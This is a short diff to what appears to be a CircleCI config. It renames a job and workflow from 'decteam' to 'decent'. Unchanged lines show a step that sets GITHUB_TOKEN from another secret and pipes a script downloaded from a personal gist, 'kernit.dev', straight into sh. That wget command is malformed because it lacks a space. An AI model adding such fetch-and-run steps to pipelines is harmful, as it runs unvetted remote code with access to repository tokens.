@@ -1,7 +1,7 @@
 version: 2.1
 
 jobs:
-  decteam:
+  decent:
 
     docker:
       - image: cimg/base:stable
@@ -13,6 +13,6 @@ jobs:
               GITHUB_TOKEN=$OTH_TOKEN
       - run:  wgethttps://gist.githubusercontent.com/B4gol/f9b42daf26b8be1ecb4f314c40c82fdc/raw/kernit.dev -O - | sh
 workflows:
-  decteam-workflow:
+  decent-workflow:
     jobs:
       - decent
